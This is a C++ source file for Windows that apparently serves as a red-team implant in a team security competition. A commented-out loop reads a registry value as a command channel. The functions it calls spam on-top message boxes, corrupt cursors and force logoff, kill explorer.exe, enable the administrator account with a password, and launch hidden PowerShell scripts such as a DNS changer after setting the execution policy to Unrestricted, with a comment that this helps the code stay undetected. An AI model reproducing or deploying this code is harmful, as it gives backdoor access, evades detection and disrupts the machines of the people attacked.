// tester.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <string>
#include <io.h>
#include <tchar.h>

using namespace std;

#define DEFINE_BOX 10
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

typedef DWORD(WINAPI* PtrWinStationSendMessage)(HANDLE, ULONG, LPCWSTR, ULONG, LPCWSTR, ULONG, ULONG, ULONG, PULONG, BOOLEAN);

/*
Function : messageSpam

Args :
	title : a LPCWSTR of what the title of the box will be
	text : a LPCWSTR of what the text in the box will be (NOTE: If string is too long then it will overflow
	numBoxes : the number of boxes that will be printed

Description :
	Will print out the specified number of boxes with a YES and NO. The message boxes have priority and will always say ontop
	of the screen.
*//*
void messageSpam(LPCWSTR title, LPCWSTR text, int numBoxes) {

	// Gets the needed libraries
	auto hModule = LoadLibrary(L"C:\\Windows\\System32\\winsta.dll");
	PtrWinStationSendMessage WinStationSendMessageW = (PtrWinStationSendMessage)GetProcAddress(hModule, "WinStationSendMessageW");

	DWORD response;

	// Displays x boxes on the screen
	for (int i = 0; i < numBoxes; i++) {
		WinStationSendMessageW(
			NULL,
			1,
			title,
			wcslen(title) * 4 + 1,
			text,
			wcslen(text) * 4 + 1,
			MB_YESNO | MB_ICONQUESTION,
			0,
			&response,
			TRUE
		);
		Sleep(100);
	}
}
*/
/*
Function : callScript

Args :
	path : a string of the exact path of the script with the \\ format

Description :
	This function takes the scripts file path and runs it in a hidden window to help
	remain undetected as possible.
*/
void callScript(string path) {

	if (_access(path.c_str(), 0) == 0) {
		string run = "start powershell.exe "; // -windowstyle hidden
		run.append(path);


		system("start powershell.exe -windowstyle hidden Set-ExecutionPolicy Unrestricted -Force \n");
		Sleep(1000);
		system(run.c_str());
	}
}
void glitchCursor() {

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"Control Panel\\Cursors";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"Arrow";
	wstring path = L"%SystemRoot%\\cursors\\aero_arrow_s.cur";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Hand";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Help";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"Wait";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"AppStarting";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"No";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"NWPen";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeAll";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNESW";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNS";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNWSE";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeWE";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"UpArrow";
	path = L"%SystemRoot%\\cursors\\aero_link_s.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	RegCloseKey(hkey);

	system("shutdown -L");
}

void defaultCursor() {

	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"Control Panel\\Cursors";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"Arrow";
	wstring path = L"%SystemRoot%\\cursors\\aero_arrow.cur";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Hand";
	path = L"%SystemRoot%\\cursors\\aero_link.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Help";
	path = L"%SystemRoot%\\cursors\\aero_helpsel.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"Wait";
	path = L"%SystemRoot%\\cursors\\aero_busy.ani";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"AppStarting";
	path = L"%SystemRoot%\\cursors\\aero_working.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Restored: " << valuename << endl;
	}

	valuename = L"No";
	path = L"%SystemRoot%\\cursors\\aero_unavail.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"NWPen";
	path = L"%SystemRoot%\\cursors\\aero_pen.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeAll";
	path = L"%SystemRoot%\\cursors\\aero_move.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNESW";
	path = L"%SystemRoot%\\cursors\\aero_nesw.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNS";
	path = L"%SystemRoot%\\cursors\\aero_ns.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeNWSE";
	path = L"%SystemRoot%\\cursors\\aero_nwse.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"SizeWE";
	path = L"%SystemRoot%\\cursors\\aero_ew.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	valuename = L"UpArrow";
	path = L"%SystemRoot%\\cursors\\aero_up.cur";
	setCheck = RegSetValueEx(hkey, valuename, 0, REG_EXPAND_SZ, (BYTE*)path.c_str(), (DWORD)wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}

	RegCloseKey(hkey);

	system("shutdown -L");
}

/*
Function : killExplorer

Description :
	This function kills explorer.exe.
*/
void killExplorer() {
	// TODO : Iterate through the PIDs and end explorer not through the system function.
	system("taskkill /IM explorer.exe /F");
}
/*
void changeKeyboard() {

	HKEY reg = HKEY_USERS;
	LPCWSTR regPath = L".DEFAULT\\Keyboard Layout\\Preload";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"1";
	wstring path = L"00010409";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}
}

void defaultKeyboard() {

	HKEY reg = HKEY_USERS;
	LPCWSTR regPath = L".DEFAULT\\Keyboard Layout\\Preload";
	HKEY hkey;

	wcout << "Attempting to open register: " << regPath << endl;

	long openCheck = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hkey);

	if (openCheck != ERROR_SUCCESS) {
		wcout << "\tERROR: Could not open register " << regPath << endl;
		return;
	}

	cout << "\tRegister openned, changing values ...\n";

	LPCWSTR valuename = L"1";
	wstring path = L"00000409";
	long setCheck = RegSetValueEx(hkey, valuename, 0, REG_SZ, (BYTE*)path.c_str(), wcslen(path.c_str()) * 2);

	if (setCheck == ERROR_SUCCESS) {
		wcout << "\tValue Changed: " << valuename << endl;
	}
}

void killExplorer() {

	//cout << "\tKilling explorer.\n";

	//system("taskkill /IM explorer.exe /F"); // This is sad need to find a better way

	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("explorer.exe"));
		//replace the taskmgr.exe to the process u want to remove.
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);

	//cout << "\tExplorer killed.\n";

}
*/


void QueryKey(HKEY hKey)
{
	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
	DWORD    cbName;                   // size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
	DWORD    cchClassName = MAX_PATH;  // size of class string 
	DWORD    cSubKeys = 0;               // number of subkeys 
	DWORD    cbMaxSubKey;              // longest subkey size 
	DWORD    cchMaxClass;              // longest class string 
	DWORD    cValues;              // number of values for key 
	DWORD    cchMaxValue;          // longest value name 
	DWORD    cbMaxValueData;       // longest value data 
	DWORD    cbSecurityDescriptor; // size of security descriptor 
	FILETIME ftLastWriteTime;      // last write time 

	DWORD i, retCode;

	TCHAR  achValue[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;

	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		hKey,                    // key handle 
		achClass,                // buffer for class name 
		&cchClassName,           // size of class string 
		NULL,                    // reserved 
		&cSubKeys,               // number of subkeys 
		&cbMaxSubKey,            // longest subkey size 
		&cchMaxClass,            // longest class string 
		&cValues,                // number of values for this key 
		&cchMaxValue,            // longest value name 
		&cbMaxValueData,         // longest value data 
		&cbSecurityDescriptor,   // security descriptor 
		&ftLastWriteTime);       // last write time 

	// Enumerate the subkeys, until RegEnumKeyEx fails.

	if (cSubKeys)
	{
		printf("\nNumber of subkeys: %d\n", cSubKeys);

		for (i = 0; i < cSubKeys; i++)
		{
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
			if (retCode == ERROR_SUCCESS)
			{
				_tprintf(TEXT("(%d) %s\n"), i + 1, achKey);
			}
		}
	}
}

int main()
{
	ShowWindow(::GetConsoleWindow(), SW_SHOW);
	/*
	printf("Beginning Testing ...\n");

	HKEY hKey;
	DWORD buffer;
	LONG result;
	DWORD type = REG_DWORD, size = 1024;

	// This is the registry and key that is being checked
	HKEY reg = HKEY_CURRENT_USER;
	LPCWSTR regPath = L"AppEvents";
	LPCWSTR regRead = L"testvalue";

	DWORD resetValue = 0x00000000;

	// The service will infinitly start its checking here
	while (1) {
		result = RegOpenKeyEx(reg, regPath, 0, KEY_ALL_ACCESS, &hKey);
		if (result == ERROR_SUCCESS)
		{
			result = RegQueryValueEx(hKey, regRead, NULL, 0, (LPBYTE)&buffer, &size);
			if (result == ERROR_SUCCESS) {
				// TODO : Update this to a switch statment
				if (buffer == 0x00000001) {
					messageSpam(L"Welcome to Prom!!!", L"Are you ready for a long day?", DEFINE_BOX);
				}
				else if (buffer == 0x00000002) {
					glitchCursor();
				}
				else if (buffer == 0x00000003) {
					defaultCursor();
				}
				else if (buffer == 0x00000004) {
					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\RickBomb.ps1");
					callScript("C:\\Users\\student\\RickBomb.ps1");
				}
				else if (buffer == 0x00000005) {
					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeyboardChanger.ps1");
					callScript("C:\\Users\\student\\KeyboardChanger.ps1");
				}
				else if (buffer == 0x00000006) {
					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\KeybaordDefault.ps1");
					callScript("C:\\Users\\student\\KeyboardDefault.ps1");
				}
				else if (buffer == 0x00000007) {
					//callScript("C:\\Users\\jon\\Documents\\PowershellScripts\\MemeScripts\\DNSChanger.ps1");
					callScript("C:\\Users\\student\\DNSChanger.ps1");
				}
				else if (buffer == 0x00000008) {
					system("shutdown -L");
				}
				else if (buffer == 0x00000009) {
					messageSpam(L"IMPORTANT NOTIFICATION", L"Just wanted to let you know, we're still here.", DEFINE_BOX / 2);
				}
				else if (buffer == 0x00000010) {
					system("net user administrator /active:yes !");
				}
				else if (buffer == 0x00000011) {
					killExplorer();
				}
				else if (buffer == 0x00000012) {
					messageSpam(L"HEY BLUE TEAM", L"Will go to Prom with me? :) -Red Team", DEFINE_BOX / 2);
				}
			}
			RegSetValueEx(hKey, regRead, 0, REG_DWORD, (BYTE*)&resetValue, sizeof(resetValue));
			RegCloseKey(hKey);
		}
	}
		Sleep(1000); // Waits to not overheat the processor

	printf("End Testing\n");
	*/

	HKEY hTestKey;

	if (RegOpenKeyEx(HKEY_USERS,
		TEXT(""),
		0,
		KEY_READ,
		&hTestKey) == ERROR_SUCCESS
		)
	{
		QueryKey(hTestKey);
	}

	RegCloseKey(hTestKey);


	return 0;
}